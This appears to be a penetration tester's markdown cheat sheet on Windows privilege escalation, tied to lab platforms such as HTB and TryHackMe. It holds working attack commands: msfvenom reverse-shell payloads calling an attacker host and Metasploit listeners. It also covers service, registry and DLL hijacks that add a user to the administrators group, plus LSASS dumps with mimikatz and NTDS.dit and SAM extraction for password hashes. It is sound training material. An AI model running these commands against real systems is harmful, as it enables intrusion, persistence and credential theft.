# Windows Privesc

## Enumeration

- You can do some manual enumeration using [Windows CMD](powershell-cmd.md#cmd)
- You can also do automatic enumeration using dedicated [tools (see the tools below)](#tools)

## Kernel Exploits

### What is a kernel

![Kernel](https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Kernel_Layout.svg/1024px-Kernel_Layout.svg.png)  
- [See the definition on Wikipedia](https://en.wikipedia.org/wiki/Kernel_(operating_system))

#### Windows kernel

![Windows kernel](https://www.thewindowsclub.com/wp-content/uploads/2019/08/Windows-Kernel.png)  
- [Windows kernel in detail here](https://www.thewindowsclub.com/what-is-a-kernel-in-os-what-are-the-types-of-kernel)

### Kernel Exploits

- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
- See an example of a privesc with a kernel exploit in [this writeup](../writeups/HTB-Devel.md)

#### Methodology

1. Enumerate win version / patch level (systeminfo)
2. Find matching exploits (Google, ExploitDB, GIthub)
3. Compile and run

**ATTENTION: Kernel exploits are often unstable and could crash the system**

### Tools

#### Executables

- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts.
- [Watson](https://github.com/rasta-mouse/Watson) is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.
- [Seatbelt](https://github.com/GhostPack/Seatbelt) C# project for performing a wide variety of local privilege escalation checks
- [SharpUp](https://github.com/GhostPack/SharpUp) C# version of PowerUp

#### PowerShell

- [Sherlock](https://github.com/rasta-mouse/Sherlock)
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) is a powershell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found.
- [JAWS](https://github.com/411Hall/JAWS) is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7.

#### Other

- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) is a python script that will provide the list of vulnerabilities the OS is vulnerable to using systeminfo
- [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
- [Precompiled kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)
- [SessionGopher](https://github.com/Arvanaghi/SessionGopher) is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information.
- [LaZagne](https://github.com/AlessandroZ/LaZagne) is a tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more
- [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) is a suite of tools that is used to monitor, manage and troubleshoot the Windows operating system owned by Microsoft. It is really useful for enumeration.

#### Pre-compiled binaries. 

It can be usefule to have precompiled binaries just ready to run
- [GhostPack-Compiled Binaries - harmj0y](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [LaZagne releases](https://github.com/AlessandroZ/LaZagne/releases/)

## Unquoted Service Path Vulnerabilities

### What is it

Abuse of the research methodology of executable of windows. We will try to place an excutable in a location windows will be looking.

### Preresquisites

- We will need write permissions in an executable folder
- Check if the binary path is unquoted, we can check a service using `sc qc name-of-service`
- Check if we have writing rights with our user we can use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"` we will have a list of user groups with read and write privs
- Use msfvenom to generate an executable file `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK-MACHINE-IP LPORT=7777 -f exe > executable_name.exe`
- Restart the service `sc start service-name `

### Methodology

- Enumerate with automatic tools or this command: `wmic service get name,displayname,pathname,startmode` (it will list the running services)
- Check if we can write in the folder of the service 

### Enumeration with powerUp

- `powershell -ep bypass`
- `. .\PowerUp.ps1`
- `Invoke-AllChecks`  
![image](https://user-images.githubusercontent.com/96747355/162632057-e45dc167-b88a-4e4d-a989-563eb810cda2.png)  

### Exploitation

- `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
- We place the executable in the folder of the program we wish to abuse
- We start the vulnerable service in our example unquotedsvc `sc start unquotedsvc`
- we should be added as an administrator we can verify this using `net localgroup administrators`

## Runas

### What is it

- It is the possibility of running a command as another user

### Enumerate

- `cmdkey /list`

### How to exploit

- Check the writeup for Access on HTB [here](../writeups/HTB-access.md) to have an example of privesc using runas

## Autorun

### What is it

- It is when you abuse the fact that a program runs automatically

### Enumerate

- Check what programs have autorun using [Windows internals - autorun](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) see example below  
![image](https://user-images.githubusercontent.com/96747355/162574595-2e7704db-5be0-411c-98f0-1b075628ec92.png)  

- Check that the program you found that allows FILE_ALL_ACCESS to Everyone using [Windows internals - accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) in our example we would type this in the cmd `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`  
![image](https://user-images.githubusercontent.com/96747355/162574634-d6459714-366e-4afa-9735-d469eb8e3ab9.png)  

**OR**  

- With [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
  - In a win cmd type `powershell -ep bypass`
  - Then `. .\PowerUp.ps1` to load powerUp
  - `Invoke-AllChecks`  
![image](https://user-images.githubusercontent.com/96747355/162574989-40f208c1-12ac-47d6-99b7-3035cf9b4297.png)  

### How to exploit

- In kali
  - `msfconsole`
  - `use multi/handler`
  - `set payload windows/meterpreter/reverse_tcp`
  - `set lhost Your-Kali-IP-Address`
  - `run`
  - In another cmd tab `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe` (give it the same name as the program that has autorun)
- Take the program you created with msfvenom in your target (python HTTP server and then the browser in your target)
- In your target
  - Place the program in the directory where the autorun program is
  - Wait for the administrator to log in
- You should have a shell in your kali in Metasploit

## Service Escalation - Registry

### What is it

- If we have admin rights of a registry key in service we could use this to make an executable run with a service (add a user, get a shell, ...)

### Enumeration

- In a powershell prompt type `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`  
![image](https://user-images.githubusercontent.com/96747355/162577548-662dd3db-2722-40c8-ae19-3ae386d32a90.png)  

### How to exploit

- We will use this [C script](https://github.com/sagishahar/scripts/blob/master/windows_service.c)
- We will modify the whoami command: `system("whoami > c:\\windows\\temp\\service.txt");`  we will add this instead `cmd.exe /k net localgroup administrators user /add` so our script now looks like this: `system("cmd.exe /k net localgroup administrators user /add");`
- We will compile it `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
- Let's now get the the exe file in our target (python http server -> browser in our target to dl the file) and put it where we have write rights (in the example it is going to be C:\Temp)
- In a cmd from our target `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
- Now we just need to start the service `sc start regsvc`
- `net localgroup administrators` we can see that our user is now in the administrators group

## Escalation via Executable Files

### What is it

- Abusing an executable that we have permissions on

### Enumeration

- `powershell -ep bypass`
- `. .\PowerUp.ps1`
- `Invoke-AllChecks`  
![image](https://user-images.githubusercontent.com/96747355/162591193-6d2cec98-1e15-492e-b129-001c59b1ae84.png)  

**OR**

- If we know what program it is we can just do `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"` where File Permissions Service is the program we want to abuse  
![image](https://user-images.githubusercontent.com/96747355/162591258-02f01743-1c36-400c-9c13-539c42db8a79.png)  

### How to exploit

- We will use this [C script](https://github.com/sagishahar/scripts/blob/master/windows_service.c)
- We will modify the whoami command: `system("whoami > c:\\windows\\temp\\service.txt");`  we will add this instead `cmd.exe /k net localgroup administrators user /add` so our script now looks like this: `system("cmd.exe /k net localgroup administrators user /add");`
- We will compile it `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
- Let's now get the the exe file in our target (python http server -> browser in our target to dl the file) and put it where we have write rights (in the example it is going to be C:\Temp)
- In the target cmd `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`
- `sc start filepermsvc`
- Our user should be in the local administrators group

## Startup Applications

### What is it

- We will abuse a program that is launched on startup in which we have rights

### Enumeration

- We can enumerate using [Windows internals - icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`  
![image](https://user-images.githubusercontent.com/96747355/162592396-a2979aa4-f502-4455-b2ca-2b7997b1763c.png)  
- The `BUILTIN/Users` group has full acces `(F)` to the Startup directory

### How to exploit

- In our attack machine `msfconsole` we launch Metasploit
- `use multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
- `set lhost IP-OF-OUR-ATTACK-MACHINE`
- `run`
- In another tab `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP-OF-OUR-ATTACK-MACHINE -f exe -o x.exe`
- We serve the executable in our target (python http server -> and browse to it from our target)
- We put the file in  "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" (If you are in the explorer you may have to type ProgramData in the path if it does not appear).
- We wait for an admin to log in
- We should have a shell in metasploit  
![image](https://user-images.githubusercontent.com/96747355/162592807-7867e7e1-62f9-4cca-89b9-78ed895ee09c.png)  

## DLL Hijacking

### What is it

- DLL is a dynamic Library they often run with executables, when an executable runs the system will look for the dll and if the dll does not exist we could replace it with one of our own.

### Enumeration

- We can find it using procmon, we need to add 2 filters "Result is NAME NOT FOUND" and "PATH ends with .dll"  
![image](https://user-images.githubusercontent.com/96747355/162593986-a50865dc-11eb-44ef-8793-60bbdd2adaa1.png)  
  - This will list the dll not found
  - We will need write access to the folder where the dll are missing

### How to exploit

- We are going to use [windows_dll.c](https://github.com/sagishahar/scripts/blob/master/windows_dll.c)
- Edit the file and modify the system command to add our user to the admin goup which would look like this: `system("cmd.exe /k net localgroup administrators user /add");`
- We can now compile it `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`
- We serve it to our target (python http server -> browser of our target)
- We put it in the path where the system will look for it, in our example it is the temp folder
- We restart the service `sc stop dllsvc & sc start dllsvc`
- Our user should be in the admin group now

## Binary path

### Enumeration

- PowerUP we should see the service exploitable under the `[*] Checking service permissions`  

**OR**

- We can use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) `accesschk64.exe -wuvc Everyone *`
  - Will list service we can write and to which everyone has access (in our example the service is daclsvc)
![image](https://user-images.githubusercontent.com/96747355/162620616-800737e9-9762-4a0e-b06d-41ea822abd32.png)  

### Exploitation

- `sc config daclsvc binpath= "net localgroup administrators user /add"`
- `sc start daclsvc`
- We should be added to the administrators group `net localgroup administrators`

## Escalation via User Privileges

### SeDebugPrivilege

#### Enumeration

- `whoami /priv` the `SeDebugPrivilege` should be listed

#### Exploitation

- `procdump.exe -accepteula -ma lsass.exe lsass.dmp` We will use ProcDump from the SysInternals suite to leverage this privilege and dump the lsass process memory.
- We can launch mimikatz from our target
  - `mimikatz.exe`
  - `log`
  - `sekurlsa::minidump lsass.dmp`
  - `sekurlsa::logonpasswords`
  - And now we can take the hashes we need
- If mimikatz does not work and if we have RDP we can dump lsass from the taskmanager (tab "Details" right click on the lsass process and select "Create dump file"
- We can then take the dump to our attack machine et use pypykatz 
  - `pypykatz lsa minidump lsass.DMP`

### SeTakeOwnershipPrivilege

- With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, Remote Code Execution (RCE) or Denial-of-Service (DOS). In this case we need a file to target.

#### Enumeration

- `whoami /priv` SeTakeOwnershipPrivilege should be listed  
![image](https://user-images.githubusercontent.com/96747355/163725780-10a9f805-e181-42af-afe3-8d28f2cc5648.png)  

#### Exploitation

- If necessary enable the privilege using [this script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) 
  - `Import-Module .\Enable-Privilege.ps1`
  - `.\EnableAllTokenPrivs.ps1`  
  ![image](https://user-images.githubusercontent.com/96747355/163725814-fde11deb-34a3-4c08-9c60-6313293833b1.png)  
- Take ownership of a flag using [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) ` 
- Check the change of ownership worked `PS C:\htb> Get-ChildItem -Path 'C:\Path\To\File' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}`
- Modify the file ACL with [icalcs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) `icacls 'C:\Path\To\File' /grant user:F`
- Use the file you have ownership now! :D
  
## Privesc via Group Privileges

### Backup Operators

#### SeBackupPrivilege

- This allows us to copy a file from a folder
- [Here](https://github.com/giuliano108/SeBackupPrivilege) is a poc to abuse this
  - We need to import the libs `Import-Module .\SeBackupPrivilegeUtils.dll` and `Import-Module .\SeBackupPrivilegeCmdLets.dll`
  - `whoami /priv` to check if we have the SeBackupPrivilege  
  ![image](https://user-images.githubusercontent.com/96747355/163727583-cecc0265-3eab-4caf-93b4-47d92842588b.png)  
  - It is disabled so we can enable it with `Set-SeBackupPrivilege`  
  ![image](https://user-images.githubusercontent.com/96747355/163727652-893533c0-1e31-4f8f-8519-fe9884fe5a01.png)  
- We can now copy protected files and then use them `Copy-FileSeBackupPrivilege 'c:\path\to\file\file.txt' .\file.txt` 

##### Copying NTDS.dit (for DC)

- This group will also let us logging in locally to a domain controller.
- NTDS is the active directory database it contains the ntlm hashes of all users and computers in the domain
- We can use [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) to make a copy of the drive `diskshadow.exe`  
```
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
- Then we just need to copy it with the SeBackupPrivilege `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\paht\to\destination\ntds.dit`

##### Backing up SAM and SYSTEM 

- `reg save HKLM\SYSTEM SYSTEM.SAV`
- `reg save HKLM\SAM SAM.SAV`

##### Extract the creds

- We can use secretdumps `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL` or the ps module DSInternals  
```
PS C:\user> Import-Module .\DSInternals.psd1
PS C:\user> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\user> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domain,DC=local' -DBPath .\ntds.dit -BootKey $key
```
- *Note: We can also use [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) to copy the files*

## Resources

{% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
{% embed url="https://tryhackme.com/room/windowsprivescarena" %} Windows privesc arena by TCM on TryHackMe {% endembed %}
{% embed url="https://www.fuzzysecurity.com/tutorials/16.html" %} Windows privesc on Fuzzy Security{% endembed %}  
{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" %} Windows privesc on PayloadsAllTheThings{% endembed %}  
{% embed url="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" %} Windows privesc on Absolomb{% endembed %}  
{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" %} Windows privesc Sushant 747{% endembed %}  
{% embed url="https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources" %} Windows-Privilege-Escalation-Resources - TCM Course Resources - Gr1mmie {% endembed %}  
{% embed url="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation" %} Windows PrivEsc Checklist - Hacktricks {% endembed %}  
{% embed url="https://github.com/gtworek/Priv2Admin" %} Priv2Admin {% endembed %}  
{% embed url="https://www.leeholmes.com/adjusting-token-privileges-in-powershell/" %} ADJUSTING TOKEN PRIVILEGES IN POWERSHELL - LEE HOLMES {% endembed %}  
{% embed url="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77" %} Enable All Token Privileges - Mark Mo{% endembed %}  
